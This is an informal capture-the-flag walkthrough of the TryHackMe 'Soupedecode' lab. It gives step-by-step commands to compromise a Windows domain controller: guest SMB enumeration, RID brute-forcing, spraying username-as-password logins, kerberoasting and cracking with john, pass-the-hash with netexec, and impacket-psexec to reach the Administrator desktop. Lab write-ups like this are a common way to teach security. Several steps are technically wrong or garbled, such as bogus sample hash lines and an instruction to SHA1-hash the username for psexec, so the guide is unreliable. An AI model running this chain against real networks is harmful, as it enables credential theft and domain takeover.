So this is the SoupeDecode challenge on TryHackMe.


u can find it inside the tryhackme easy difficulty room.


so let s begin by taking a look at the challenge description.


# Soupedecode is an intense and engaging challenge in which players must compromise a domain controller by exploiting Kerberos authentication, navigating through SMB shares, performing password spraying, and utilizing Pass-the-Hash techniques. Prepare to test your skills and strategies in this multifaceted cyber security adventure.#

so this is kinda of a challenge about domain controllers and kerberos authentication.smb shares and everythings

so first we gonna do a nmap scan to see what ports are open on the target machine.
by the way all the tools u gonna use here is already pre installed inside a kali linux machine.or a parrot os machine.


using = nmap -sC -sV -p- -T4 --min-rate=1000 -oN nmap/allports.txt
so the flag -sC for default script
*the flag -sV for version detection
*the flag -p- for all ports
*the flag -T4 for faster scan
*the flag --min-rate=1000 for minimum rate of 1000 packets per second
*the flag -oN for output in normal format


we got the response from nmap 
#
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-04 11:44:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:  
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-04T11:45:40+00:00
|_ssl-date: 2026-02-04T11:46:19+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Not valid before: 2026-02-03T11:25:31
|_Not valid after:  2026-08-05T11:25:31
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49713/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
#




okay so here we have a bunch of open port the first thinks i m gonna do is trying to enemurate the SMB and to see if the guest account is enabled or not because if the guest account is enabled we can use it to access the SMB shares and maybe find some useful information there.


**there are one way with metasploit using the lookupsid module where we give the  RHOSTS the guest smbUser and let it treat it
u just navigate in metasploit and see it 

 
**and another way using nxcat where we can use the smbclient to connect to the smb shares and see if we can access them with the guest account.


command : nxc smb \\<IP_ADDRESS>\ -u "guest" -p "" --shares

#
output:
SMB         10.67.184.231   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01)
(domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.67.184.231   445    DC01             [+] SOUPEDECODE.LOCAL\guest:  
SMB         10.67.184.231   445    DC01             [*] Enumerated shares
SMB         10.67.184.231   445    DC01             Share           Permissions     Remark
SMB         10.67.184.231   445    DC01             -----           -----------     ------
SMB         10.67.184.231   445    DC01             ADMIN$                          Remote Admin
SMB         10.67.184.231   445    DC01             backup                           
SMB         10.67.184.231   445    DC01             C$                              Default share
SMB         10.67.184.231   445    DC01             IPC$            READ            Remote IPC
SMB         10.67.184.231   445    DC01             NETLOGON                        Logon server share
SMB         10.67.184.231   445    DC01             SYSVOL                          Logon server share
SMB         10.67.184.231   445    DC01             Users
#

because the guest account is enabled we can access the smb shares and we can see that there are some interesting shares like backup and users and maybe we can find some useful information there.
// there is backup which may be useful later


i only have read access to the IPC$ share and nothing else so the metasploit is kinda the better way to do it so i take the lookupsid module and i give it the RHOSTS the guest smbUser and let it treat it and see if we can find some useful information there.

it returned 1069 accounts 

so now we have a list of users that we can use to perform password spraying attack to find valid credentials.

i used a python script to only get the username from the input from metasploit

then with only the username:


o
## so the objectif is to try out all the username with a password same as the username to see if we can find any valid credentials.

command : netexec smb \\<IP_ADDRESS>\ -u user.txt -p user1.txt --no-bruteforce | grep -v FAILURE


we got one that match  user = ybob317 password = ybob317 in SOUPEDECODE.LOCAL domain
using this credentials we can try to access the smb shares again to see if we can find any useful information there.


command: smbclient -L /<IP_ADDRESS> -U 'SOUPEDECODE.LOCAL\ybob317'
when prompted for the password we give ybob317

no shares really interesting we have a shares Users in there we gonna try accessing it

command : smbclient -L //ip_address>/Users -U 'SOUPEDECODE.LOCAL\ybob317'
when prompted for the password we give ybob317



we get inside and see the users we found going inside his folder we can find the users.txt inside /desktop

inside a share use command :  more user.txt  to print it
and :q to quit the mode



the next Step :



using impacket-GetUserSPNS.py to enumerate the SPN to find any service account that we can use to perform pass the hash attack


command : impacket-GetUserSPNS SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip <IP_ADDRESS> -request


we get a lot of hash for a lot of service

ftp/fileserver
fw/proxyserver
http/backupServer
http/Webserver
https/monitoringserver



putting all the file inside a text i named hash.txt 

like this as a exemple fileserver:SOUPDECODE.LOCAL$@aad3b435b51404eeaad3b435b51404ee:bbf7e5f4c2d6c6f4e8f4e8f4e8f4e8f4
proxyserver:SOUPDECODE.LOCAL$@aad3b435b514



we use john to do some decryption
command :  john hash.txt -w=/usr/share/wordlists/rockyou.txt
and we get one password for the file_svc



we then reconnect to smb
command : smbclient -L //<IP_ADDRESS>/ -U 'SOUPEDECODE.LOCAL\file_svc'
when prompted for the password
and we see the share backup that we said earlier we have read access to it


we reconnect using smbclient
command : smbclient //<IP_ADDRESS>/backup -U 'SOUPEDECODE.LOCAL\file_svc'

and we do a get command 
command : get backup.extract.txt

we get a username:uid:hash type file so we have to get everythings alone the hash and the users

using this command 

command : cat backup.extract.txt | cut -d ':' -f 1 > backup.users.txt

and

command : cat backup.extract.txt | cut -d ':' -f 4 | awk '{print "00000000000000000000000000000000:"$1}' > backup.hashes. //some windows stuff

we do the same with netexec try to see if a username use the same ass password hashes 
this is the pass the hash method


netexec smb //ip adress -u backup.user.txt -H backup.hashes.txt
-H = to pass a hash


and we got a match the fileserver match one of the hash


so we got a hash and a username right now to use impacket-psexec we have to transform the username to hash go to cyberchef and transform the username to hash using sha1


exemple : 
username = SOUPEDECODE.LOCAL\FileServer$
password = some hash


send the username to cyberchef and try the impacket command here



command = impacket-psexec 'FileServer$@/ipadress' -hashes 'hash_of_the_username:password_hash_that_match'

and we get inside seing a little windows terminale we navigate throug ../../Users/Administrators/Desktop
and we got the root.txt


Congrat!!!!!
